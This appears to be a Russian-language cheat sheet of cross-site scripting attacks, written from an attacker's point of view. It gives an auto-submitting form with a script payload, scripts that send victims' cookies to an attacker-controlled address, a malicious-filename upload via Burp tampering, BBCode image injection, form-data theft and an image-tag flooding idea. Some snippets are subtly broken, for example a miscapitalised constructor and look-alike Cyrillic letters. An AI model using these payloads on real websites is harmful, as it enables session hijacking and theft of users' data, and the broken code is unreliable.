Пассивные – которые требуют непосредственного вмешательства субъекта атаки. 
Суть заключается в том, чтобы заставить жертву перейти по вредоносной ссылке для выполнения «вредокода». 
Такой тип атак более сложный в реализации, ведь необходимо обладать не только техническими, но и психологическими знаниями.

Переадресация с сайта злоумышленника.

<form method="post" action="http://site.com/page.php">
  <input type="hidden" name="var" value="<script>alert('xss')</script>">
</form>
<script type="text/javascript">
  document.getElementsByTagName('form')[0].submit();
</script>

Активные – это вид атак, когда хакер пытается найти уязвимость в фильтре сайта. 
Как же реализуется такая атака? Все очень просто. Нужно при помощи комбинации тегов и символов создать такой запрос, 
чтобы сайт его понял и выполнил команду. Как только дыра в безопасности найдена, в наш запрос можно вложить «вредокод», 
который, к примеру, будет воровать cookie и пересылать в удобное нам место. Приведем пример скрипта, ворующего “печеньки” с сайта:

Img = new image()
Img.src = http://site.gif?+document.cookie;

----------------------------------------------------------------------------------------------------------
Идея: создать файл <img src = x onerror=alert(1)>.jpeg и отправить жертве.

Под Linux системами файл с таким именем создать просто

# touch '<img src = x onerror=alert(1)>.jpeg' 


Но под Windows — нельзя, ввиду особенностей файловых систем этой ОС. Решение очень простое, 
пускаем весь трафик Burp Proxy и подменяем данные на этапе их отправки

------WebKitFormBoundaryFS9MRFpHBt02jHkz
Content-Disposition: form-data; name="upload[0]"; filename=""><img src = x onerror=alert(1)>"
-----------------------------------------------------------------------------------------------------------
Использование тегов.

Пример использования:

[img]http://blabla.ru/1.jpg/dynsrc=javascript:alert()[/img]
[img]»»>«script>http://blabla.ru/1.jpg/dynsrc=javascript:alert()[/img]
-----------------------------------------------------------------------------------------------------------

Кража активной сессии

var іmg = new Image();
іmg.srс = 'http://site/xss.php?' + document.cookie;

также есть <iframe>, <img>, <script>, background:url(); и т.п.
-----------------------------------------------------------------------------------------------------------
Кража данных из форм
Ищем форму через, например, getElementById и отслеживаем событие onsubmit.

------------------------------------------------------------------------------------------------------------
DDoS-атака (распределенная атака типа «отказ в обслуживании»)

<img src="http://site.com/">
------------------------------------------------------------------------------------------------------------
